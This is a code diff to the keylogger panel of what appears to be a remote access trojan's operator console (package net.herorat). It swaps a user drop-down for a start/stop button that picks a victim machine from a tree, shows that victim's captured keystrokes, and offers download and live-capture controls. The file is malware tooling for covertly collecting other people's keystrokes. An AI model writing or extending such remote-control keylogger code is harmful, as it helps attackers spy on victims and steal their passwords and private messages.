@@ -16,6 +16,7 @@ import javax.swing.JTextArea;
 import javax.swing.event.ChangeEvent;
 import javax.swing.event.ChangeListener;
 
+import net.herorat.Main;
 import net.herorat.features.keylogger.Keylogger;
 import net.herorat.features.servers.Server;
 import net.herorat.network.Network;
@@ -26,8 +27,9 @@ public class PanelKeylogger extends JPanel
 	private static final long serialVersionUID = -3873818066335138946L;
 	
 	private JLabel label_select;
-	public JComboBox<String> combo_select;
-	public String combo_selected_item = "";
+	private JButton button_start;
+	private boolean running;
+	private Server server;
 	
 	private JScrollPane scroll_output;
 	public JTextArea area_output;
@@ -57,44 +59,58 @@ public class PanelKeylogger extends JPanel
 	
 	private void createSelect()
 	{
-		label_select = new JLabel("Select an user: ");
-		combo_select = new JComboBox<String>( Network.getServerList(false) );
+		label_select = new JLabel("Select a user from the tree list.");
+		button_start = new JButton("Start service");
+		button_start.addActionListener(new ActionListener() {
+			@Override
+			public void actionPerformed(ActionEvent e) {
+				if(running){
+					stopService();
+				}else{
+					startService();
+				}
+			}
+		});
 		
 		JPanel top_panel = new JPanel();
 		top_panel.setLayout(new BorderLayout(5, 0));
 		top_panel.setBorder(BorderFactory.createEmptyBorder(0, 2, 5, 2));
 		top_panel.add(label_select, BorderLayout.LINE_START);
-		top_panel.add(combo_select);
+		top_panel.add(button_start, BorderLayout.LINE_END);
 		add(top_panel, BorderLayout.NORTH);
-		
-		combo_select.addActionListener(new ActionListener() {
-			@Override
-			public void actionPerformed(ActionEvent arg0)
-			{
-				String selection = String.valueOf(combo_select.getSelectedItem());
-				if (combo_select.getSelectedIndex() != 0 && !selection.equals(combo_selected_item))
-				{
-					combo_selected_item = selection;
-					area_output.setText("Loading ...");
-					Server server = Network.findWithCombo(combo_selected_item);
-					if (server != null)
-					{
-						area_output.setText(server.buffer_logger.toString());
-						button_download.setEnabled(true);
-						box_live.setEnabled(true);
-					}
-				}
-				else if (combo_select.getSelectedIndex() == 0)
-				{
-					combo_selected_item = "";
-					area_output.setText("");
-					button_download.setEnabled(false);
-					box_live.setEnabled(false);
-				}
-			}
-		});
+
 	}
-	
+
+	public Server getCurrentServer(){
+		return server;
+	}
+
+	private void startService(){
+		server = Main.mainWindow.ServerStatusTree.getSelectedServer();
+		if (server != null)
+		{
+			running = true;
+			button_start.setText("Stop service");
+			label_select.setText("Talking to: "+server.getServerName()+"@"+server.getIp());
+			area_output.setText("Loading ...");
+			area_output.setText(server.buffer_logger.toString());
+			button_download.setEnabled(true);
+			box_live.setEnabled(true);
+		}else{
+			stopService();
+		}
+	}
+
+	private void stopService(){
+		server = null;
+		running = false;
+		area_output.setText("");
+		button_start.setText("Start service");
+		label_select.setText("Select a user from the tree list.");
+		button_download.setEnabled(false);
+		box_live.setEnabled(false);
+	}
+
 	private void createOutput()
 	{
 		scroll_output = new JScrollPane();
@@ -118,7 +134,6 @@ public class PanelKeylogger extends JPanel
 		button_download.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent evt)
 			{
-				Server server = Network.findWithCombo(combo_selected_item);
 				if (server != null) Keylogger.sendDownload(server);
 			}
 		});
@@ -128,7 +143,6 @@ public class PanelKeylogger extends JPanel
 		box_live.addChangeListener(new ChangeListener() {
 			public void stateChanged(ChangeEvent evt)
 			{
-				Server server = Network.findWithCombo(combo_selected_item);
 				if (server != null) Keylogger.sendLive(server, box_live.isSelected());
 			}
 		});
